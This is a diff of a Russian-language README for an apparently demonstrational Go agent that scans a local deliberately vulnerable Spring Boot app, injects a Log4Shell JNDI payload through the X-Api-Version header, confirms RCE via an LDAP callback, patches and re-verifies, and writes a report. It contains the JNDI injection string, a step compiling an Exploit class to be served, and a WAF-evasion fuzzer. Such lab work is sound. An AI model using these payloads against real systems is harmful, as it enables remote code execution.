@@ -40,17 +40,22 @@ graph TD
 
 Программная структура агента разработана в соответствии с принципами чистой архитектуры (*Hexagonal Architecture / Ports and Adapters*), SOLID и TDD:
 
-* **[main.go](main.go)** — Точка входа. Управляет жизненным циклом фоновых процессов (запуск/останов LDAP-коллбека и JVM) и координирует запуск горутины агента.
-* **[agent.go](agent.go)** — Когнитивный контур. Реализует управляющий цикл и решающее правило выбора стратегии `Think()` на основе вектора доверия (*Belief State*).
-* **[memory.go](memory.go)** — Потокобезопасная база знаний (*KnowledgeBase* / LTM) на базе `sync.RWMutex`, исключающая race conditions при конкурентной записи асинхронных OOB-коллбеков.
-* **[tools.go](tools.go)** — Реестр полиморфных эффекторов, имплементирующих интерфейс `Tool`:
+* **[cmd/agent/main.go](cmd/agent/main.go)** — Точка входа. Управляет жизненным циклом фоновых процессов и координирует запуск горутины агента.
+* **[internal/agent/agent.go](internal/agent/agent.go)** — Когнитивный контур. Реализует управляющий цикл и решающее правило выбора стратегии `Think()`.
+* **[internal/core/model.go](internal/core/model.go)** — Потокобезопасная база знаний (`KnowledgeBase` / LTM) на базе `sync.RWMutex`.
+* **[internal/core/effector.go](internal/core/effector.go)** — Интерфейс `Tool` для эффекторов.
+* **[internal/effectors/](internal/effectors/)** — Реестр полиморфных эффекторов (инструментов):
   * `ToolPortScanner` — Разведка сетевого периметра.
   * `ToolDiscovery` — Поиск точек сочленения и векторов ввода (`X-Api-Version`).
   * `ToolPayloadGenerator` — Синтез сигнатурного вектора JNDI.
   * `ToolProber` — Проверка уязвимости методом внеполосной (Out-of-Band) трассировки.
   * `ToolSemanticFuzzer` — Обход классификаторов фильтрации (WAF Evasion) с помощью вложенных синтаксических мутаций.
-  * `ToolRemediator` — Автоматический патчинг (перезапуск JVM с флагом `-Dlog4j2.formatMsgNoLookups=true`).
+  * `ToolRemediator` — Автоматический патчинг.
   * `ToolReporter` — Формирование отчета в соответствии с ГОСТ Р 56939-2016.
+* **[pkg/oob/](pkg/oob/)** — Out-of-band слушатели (LDAP и HTTP).
+* **[pkg/target/](pkg/target/)** — Управление жизненным циклом и перезапуском локальной Java-цели.
+* **[deployments/](deployments/)** — Конфигурационные файлы для развертывания (Docker, Compose).
+* **[test/vulnerable-app/](test/vulnerable-app/)** — Уязвимое тестовое Java Spring Boot приложение.
 
 ---
 
@@ -66,18 +71,18 @@ $$EfficiencyScore = \frac{SuccessCount}{UsageCount}$$
 | :--- | :--- | :--- | :--- |
 | **1** | `port_scanner` | Проверка TCP-сокета хоста `:8080`. | Обнаружен открытый HTTP-порт веб-службы. |
 | **2** | `discovery` | Выполнение GET-запроса, парсинг DOM и заголовков. | Идентифицирован вектор ввода: заголовок `X-Api-Version`. |
-| **3** | `payload_generator` | Синтез базового эксплоит-вектора. | База данных пополняется строкой `\${jndi:ldap://127.0.0.1:1389/a\}`. |
+| **3** | `payload_generator` | Синтез базового эксплоит-вектора. | База данных пополняется строкой `\${jndi:ldap://127.0.0.1:1389/Exploit\}`. |
 | **4** | `prober` | Первичная атака. Агент отправляет полезную нагрузку. | Встроенный LDAP-слушатель фиксирует входящее TCP-соединение на порт `1389`. Выявлен факт RCE. |
 | **5** | `remediator` | Автоматическое исправление. Запись флага в `remediation.properties` и перезапуск JVM. | Процесс Spring Boot перезапущен с флагом `-Dlog4j2.formatMsgNoLookups=true`. `PatchApplied = true`. |
 | **6** | `prober` | Верификация (повторный зондирующий запрос). | Ожидание OOB-соединения на порту `1389`. Соединение отсутствует $\rightarrow$ `PatchVerified = true`. |
-| **7** | `reporter` | Генерация markdown-отчета. | Документ `cve_2021_44228_report.md` сформирован. `ReportGenerated = true`. |
+| **7** | `reporter` | Генерация markdown-отчета. | Документ `reports/cve_2021_44228_report.md` сформирован. `ReportGenerated = true`. |
 | **8** | `stop` | Терминация. | Завершение работы. |
 
 ---
 
 ## 📦 Спецификация уязвимого Java-приложения
 
-Приложение-цель в директории `vulnerable-app/` представляет собой минимальный REST-сервис на базе **Spring Boot 2.7.18** с намеренно заниженными версиями библиотек **Apache Log4j2**:
+Приложение-цель в директории `test/vulnerable-app/` представляет собой минимальный REST-сервис на базе **Spring Boot 2.7.18** с намеренно заниженными версиями библиотек **Apache Log4j2**:
 
 ```xml
 <dependency>
@@ -101,26 +106,32 @@ logger.info("[AUDIT] API Version header logged: {}", apiVersion);
 ### Предварительные требования
 * **JDK 17+** (проверьте через `java -version`)
 * **Maven 3.8+** (проверьте через `mvn -version`)
-* **Go 1.25.0+** (проверьте через `go version`)
+* **Go 1.21+** (проверьте через `go version`)
 
 ### 1. Сборка Java-микросервиса
 Скомпилируйте Java-цель в толстый JAR-артефакт:
 ```bash
-cd vulnerable-app
+cd test/vulnerable-app
 mvn clean package
-cd ..
+cd ../..
 ```
-*Убедитесь, что в директории `vulnerable-app/target/` успешно создался файл `vulnerable-app-simple-1.0.0.jar`.*
+*Убедитесь, что в директории `test/vulnerable-app/target/` успешно создался файл `vulnerable-app-simple-1.0.0.jar`.*
 
-### 2. Компиляция и запуск демонстрационного стенда
+### 2. Сборка Exploit payload
+Скомпилируйте Java Exploit класс, который будет раздаваться HTTP-сервером:
+```bash
+javac internal/payload/Exploit.java
+```
+
+### 3. Компиляция и запуск демонстрационного стенда
 Запуск в режиме интерпретации Go на лету:
 ```bash
-go run .
+go run ./cmd/agent
 ```
 
 Или выполните компиляцию в исполняемый бинарный файл:
 ```bash
-go build -o test_agent
+go build -o test_agent ./cmd/agent
 ./test_agent
 ```
 
